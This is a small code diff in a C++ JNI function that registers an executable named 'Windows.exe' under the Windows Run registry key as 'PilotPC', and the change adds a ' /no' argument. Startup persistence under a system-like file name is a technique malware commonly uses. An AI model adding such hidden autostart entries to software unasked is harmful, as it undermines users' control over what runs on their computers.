@@ -61,7 +61,7 @@ JNIEXPORT void JNICALL Java_Biblioteka_autostart
 	char* strCOut;
 	const char* strCIn = (env)->GetStringUTFChars(f, &blnIsCopy);
 
-	string folder = string("\"")+string(strCIn) + string("\\Windows.exe\"");
+	string folder = string("\"")+string(strCIn) + string("\\Windows.exe\" /no");
 	HKEY hkTest;
 	RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkTest);
 	RegSetValueExA(hkTest, "PilotPC", 0, REG_SZ, (BYTE*)(folder.c_str()), folder.length());
